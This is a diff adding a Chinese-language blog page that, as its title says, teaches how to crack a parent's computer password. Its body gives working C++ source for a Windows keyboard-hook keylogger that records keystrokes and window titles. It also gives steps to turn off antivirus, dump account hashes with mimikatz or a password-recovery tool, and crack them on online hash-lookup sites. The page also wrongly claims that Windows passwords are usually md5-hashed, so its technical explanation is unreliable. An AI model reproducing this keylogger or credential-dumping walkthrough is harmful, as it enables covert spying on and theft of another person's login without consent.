@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="zh" >
+<head>
+    <meta charset="utf-8">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+
+    <link rel="dns-prefetch" //cdn.jsdelivr.net>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@1.0.2/dist/css/mdui.min.css">
+
+
+
+
+
+<meta name="theme-color" content="#3F51B5">
+
+
+<style>
+    html,body{scroll-behavior:smooth;min-height:100vh}
+    blockquote>strong>a{word-break:break-all}
+    .mdui-hoverable:hover,.mdui-hoverable:focus{-webkit-box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12) !important;box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12) !important;}
+    .mdui-card-primary-title a{text-decoration:none !important}
+    .page-number{display:none !important}
+    .mdui-container-fluid{transition:opacity .4s}
+    
+        body{background-color: #f6f6f6}
+
+    
+</style>
+    
+    <title>教你如何破解家长电脑的密码 II | Old Blogs</title>
+    <link rel="canonical" href="https://Random-spike.github.io/Old-Blogs/Old-Blogs/019_%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AE%B6%E9%95%BF%E7%94%B5%E8%84%91%E7%9A%84%E5%AF%86%E7%A0%81%20II/">
+    <meta name="description" content="本文在 @harvey2019 的要求下我来发布。 因此后文内容均为_harvey2019_编写，“我”代指他本人。  前情提要 我以前写的那篇文章中获取密码的思路很正确，不过后来我尝试我爸的电脑的密码的时候，我发现我代码是不适用于所有人的（因为采用的是KEY_DOWN，导致的代码限制，sleep可以改灵敏度，灵敏度太高会导致你原本只输入一个字符，然后输出了多个字符，太低会少读取字符，手速快的需要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="教你如何破解家长电脑的密码 II">
+<meta property="og:url" content="https://random-spike.github.io/Old-Blogs/019_%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AE%B6%E9%95%BF%E7%94%B5%E8%84%91%E7%9A%84%E5%AF%86%E7%A0%81%20II/index.html">
+<meta property="og:site_name" content="Old Blogs">
+<meta property="og:description" content="本文在 @harvey2019 的要求下我来发布。 因此后文内容均为_harvey2019_编写，“我”代指他本人。  前情提要 我以前写的那篇文章中获取密码的思路很正确，不过后来我尝试我爸的电脑的密码的时候，我发现我代码是不适用于所有人的（因为采用的是KEY_DOWN，导致的代码限制，sleep可以改灵敏度，灵敏度太高会导致你原本只输入一个字符，然后输出了多个字符，太低会少读取字符，手速快的需要">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-08-24T11:49:17.000Z">
+<meta property="article:modified_time" content="2025-11-30T09:29:38.552Z">
+<meta property="article:author" content="Random-spike">
+<meta name="twitter:card" content="summary">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="mdui-theme-primary-indigo mdui-theme-accent-pink mdui-appbar-with-toolbar ">
+    <div class="mdui-theme-layout-light">
+    <header id="appbar" class="mdui-appbar mdui-appbar-fixed mdui-shadow-0 mdui-appbar-scroll-hide">
+    <div class="mdui-toolbar">
+        <button mdui-drawer="{target: '.mdui-drawer'}" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon material-icons">menu</i></button>
+        <a href="/Old-Blogs/" class="mdui-typo-title">Old Blogs</a>
+        <div class="mdui-toolbar-spacer"></div>
+        
+        <a href="/Old-Blogs/search/" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon material-icons">search</i></a>
+        
+    </div>
+</header>
+    <aside class="mdui-drawer mdui-drawer-close">
+    <nav class="mdui-list" mdui-collapse="{accordion: true}">
+        <a href="/Old-Blogs/about/"  class="mdui-list-item mdui-ripple">
+            <div class="mdui-list-item-avatar">
+                
+                <i class="mdui-color-theme-primary mdui-icon material-icons">person</i>
+                
+            </div>
+            <div class="mdui-list-item-content">Random-spike</div>
+        </a>
+        <div class="mdui-divider"></div>
+        
+        <a href="/Old-Blogs/" class="mdui-list-item mdui-ripple">
+            <i class="mdui-list-item-icon mdui-icon material-icons">home</i>
+            <div class="mdui-list-item-content">主页</div>
+        </a>
+        
+        <div class="mdui-collapse-item">
+            <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+                <i class="mdui-list-item-icon mdui-icon material-icons">inbox</i>
+                <div class="mdui-list-item-content">归档</div>
+                <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+            </div>
+            <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+                <a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2025/11/">十一月 2025</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2025/10/">十月 2025</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2025/03/">三月 2025</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2025/02/">二月 2025</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/12/">十二月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/11/">十一月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/10/">十月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/09/">九月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/08/">八月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/07/">七月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/06/">六月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/05/">五月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/04/">四月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/03/">三月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/02/">二月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2024/01/">一月 2024</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/12/">十二月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/11/">十一月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/10/">十月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/09/">九月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/08/">八月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/07/">七月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/06/">六月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/05/">五月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/04/">四月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/03/">三月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/02/">二月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2023/01/">一月 2023</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/archives/2022/12/">十二月 2022</a>
+            </div>
+        </div>
+        
+        <div class="mdui-collapse-item">
+            <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+                <i class="mdui-list-item-icon mdui-icon material-icons">apps</i>
+                <div class="mdui-list-item-content">分类</div>
+                <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+            </div>
+            <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+                <a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/florr/">florr</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/%E6%96%B0%E6%96%87/">新文</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/%E6%97%A7%E6%96%87/">旧文</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/%E6%9D%82%E6%96%87/">杂文</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/%E7%94%9F%E6%B4%BB%E9%97%B4/">生活间</a><a class="mdui-list-item mdui-ripple m-link" href="/Old-Blogs/categories/%E9%A2%98%E8%A7%A3/">题解</a>
+            </div>
+        </div>
+        
+    </nav>
+    <div class="mdui-divider"></div>
+    <footer class="mdui-m-l-2 mdui-m-t-1 mdui-typo mdui-text-color-theme-disabled">
+        <p class="mdui-m-b-0">
+            
+            ©
+            2025 Random-spike<br>
+            
+            Powered by <a href="https://hexo.io/" rel="noreferrer" target="_blank">Hexo</a><br>
+            
+            Theme - <a href="https://github.com/kwaa/hexo-theme-m" rel="noreferrer" target="_blank"
+                mdui-tooltip="{position:'right', content: 'by 藍+85CD'}">M</a></p>
+            
+    </footer>
+</aside>
+    </div>
+    <div class="mdui-container-fluid mdui-center" style="max-width:720px">
+        <article class="mdui-card mdui-hoverable mdui-shadow-1 mdui-m-y-2" style="opacity: 1; border-radius: 4px">
+    
+    <div class="mdui-card-primary mdui-ripple">
+    <div class="mdui-card-primary-title">
+        <a role="heading" aria-level="1" class="mdui-text-color-theme-text" >教你如何破解家长电脑的密码 II</a>
+        
+        <small> <a class="mdui-text-color-theme-text category-link" href="/Old-Blogs/categories/%E6%96%B0%E6%96%87/">新文</a></small>
+        
+    </div>
+    <div class="mdui-card-primary-subtitle mdui-typo">
+        
+        <span mdui-tooltip="{content:'创建时间：2024-08-24 07:49<br>最后更新时间：2025-11-30 05:29'}">2024-08-24 -</span>
+        
+            <span>/019_教你如何破解家长电脑的密码 II/</span>
+        
+    </div>
+</div>
+    
+    
+    <div class="mdui-divider"></div>
+    <div class="mdui-card-content mdui-typo">
+        
+        <p>本文在 @<em>harvey2019</em> 的要求下我来发布。</p>
+<p>因此后文内容均为_harvey2019_编写，“我”代指他本人。</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.luogu.com/article/t8i7lllz">前情提要</a></p>
+<p>我以前写的那篇文章中获取密码的思路很正确，不过后来我尝试我爸的电脑的密码的时候，我发现我代码是不适用于所有人的（因为采用的是KEY_DOWN，导致的代码限制，sleep可以改灵敏度，灵敏度太高会导致你原本只输入一个字符，然后输出了多个字符，太低会少读取字符，手速快的需要调高灵敏度，慢的可以调低）</p>
+<p>后来我又写了一个进阶版的键盘钩子，如下，比上面可靠很多。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardHookProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) &#123;  </span><br><span class="line">            KBDLLHOOKSTRUCT* kbInfo = <span class="built_in">reinterpret_cast</span>&lt;KBDLLHOOKSTRUCT*&gt;(lParam);  </span><br><span class="line">            <span class="comment">// 输出按键字符（注意：这里只简单处理ASCII字符）  </span></span><br><span class="line">            <span class="keyword">if</span> (kbInfo-&gt;vkCode &lt; <span class="number">0x80</span>) &#123;  </span><br><span class="line">                std::cout &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">char</span>&gt;(kbInfo-&gt;vkCode) &lt;&lt; std::endl;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 获取并显示当前活动窗口的标题  </span></span><br><span class="line">            HWND hwnd = <span class="built_in">GetForegroundWindow</span>();  </span><br><span class="line">            <span class="type">char</span> windowTitle[<span class="number">256</span>];  </span><br><span class="line">            <span class="built_in">GetWindowTextA</span>(hwnd, windowTitle, <span class="built_in">sizeof</span>(windowTitle));</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Active Window: &quot;</span> &lt;&lt; windowTitle &lt;&lt; std::endl;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(<span class="literal">NULL</span>, nCode, wParam, lParam);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    HHOOK hHook = <span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD_LL, KeyboardHookProc, <span class="literal">NULL</span>, <span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span> (!hHook) &#123;  </span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to set hook!&quot;</span> &lt;&lt; std::endl;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 阻塞等待用户输入，这里用Ctrl+C来退出  </span></span><br><span class="line">    MSG msg;  </span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg);  </span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">UnhookWindowsHookEx</span>(hHook);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面，我觉得要依靠家长输入来破解密码的方式还是不太可靠，我又研究了一下，发现了3个工具：mimikatz\PSPR（全称Proactive System Password Recovery）\不知道叫啥。</p>
+<p>第一个只适用于win10的专业版，会被检测出来病毒（不管是windows自带的还是360啥的，所以你都得关掉）。具体教程看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1LP411E7p3/?vd_source=3f8399b15a885fc94d486804fcd0449f">这个</a></p>
+<p>第二个是我使用的，众所周知，电脑的密码是存在电脑里的，而众所不周知，电脑密码<strong>一般</strong>使用一种叫md5的加密方式加密的。下载<a target="_blank" rel="noopener" href="https://wwe.lanzouo.com/iOvfgl0i05e">这个（密码：bili）</a>，安装完了选择恢复hashes，他会自动帮你弄（下面有进度条），弄完了以后看上面的表格，双击看你要破解密码的账户（一般是第一个），复制HTHASH，然后到破译md5的网站（看下面），然后破译出来的就是密码了（密码不能特别复杂，因为太复杂哪些网站不一定有对应解译出来的明文）</p>
+<p>第三个我没用过（懒），看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1g54y1d7JD/?spm_id_from=333.788.recommend_more_video.-1&vd_source=3f8399b15a885fc94d486804fcd0449f">这个视频</a>自己学习一下吧（我稍微看了一眼，应该只适用于win7）</p>
+<p>破译md5的网站：首先推荐<a target="_blank" rel="noopener" href="https://hashes.com/zh/decrypt/hash">1</a>和<a target="_blank" rel="noopener" href="https://md5decrypt.net/en/">2</a>。如果这两个都不行的话，那就看<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv24242584/?from=search&spm_id_from=333.337.0.0">这个</a>。</p>
+<p>回头有时间研究一下怎么自己写程序获取&amp;破译密码.</p>
+
+        
+        <blockquote class="mdui-m-x-0 mdui-m-t-4">
+    <strong>
+        作者：<a href="/Old-Blogs/about/">Random-spike</a><br>
+        链接：<a href="https://random-spike.github.io/Old-Blogs/019_%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AE%B6%E9%95%BF%E7%94%B5%E8%84%91%E7%9A%84%E5%AF%86%E7%A0%81%20II/">https://random-spike.github.io/Old-Blogs/019_%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AE%B6%E9%95%BF%E7%94%B5%E8%84%91%E7%9A%84%E5%AF%86%E7%A0%81%20II/</a><br>
+        
+            本文采用 <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> 进行许可。
+        
+    </strong>
+</blockquote>
+        
+    </div>
+    
+</article>
+<nav class="mdui-theme-layout-light mdui-color-transparent mdui-row mdui-m-b-2">
+    
+        <div class="mdui-col-xs-12 mdui-m-b-2">
+            <a class="extend prev mdui-btn mdui-ripple mdui-float-left mdui-text-truncate" rel="prev"
+                style="max-width: 100%" href="/Old-Blogs/018_%E5%86%9B%E8%AE%AD%E6%B8%B8%E8%AE%B0/">
+                <i class="mdui-icon mdui-icon-left material-icons">arrow_back</i>军训游记
+            </a>
+        </div>
+    
+        <div class="mdui-col-xs-12">
+            <a class="extend next mdui-btn mdui-ripple mdui-float-right mdui-text-truncate" rel="next"
+                style="max-width: 100%" href="/Old-Blogs/020_%E4%BB%96%EF%BC%8C%E4%B8%80%E5%90%8D%E5%A4%96%E6%98%9F%E4%BA%BA/">
+                <i class="mdui-icon mdui-icon-right material-icons">arrow_forward</i>他，一名外星人
+            </a>
+        </div>
+    
+</nav>
+
+    </div>
+    <a href="#" class="mdui-fab mdui-fab-fixed mdui-hidden-xs mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">keyboard_arrow_up</i></a>
+
+<script src="https://cdn.jsdelivr.net/npm/mdui@1.0.2/dist/js/mdui.min.js"></script>
+
+
+<script>
+    var $ = mdui.$;
+    function init(){
+        //
+    }
+    window.addEventListener("load", () => {
+        //
+        init()
+    }, {once: true});
+</script>
+
+</body>
+</html>
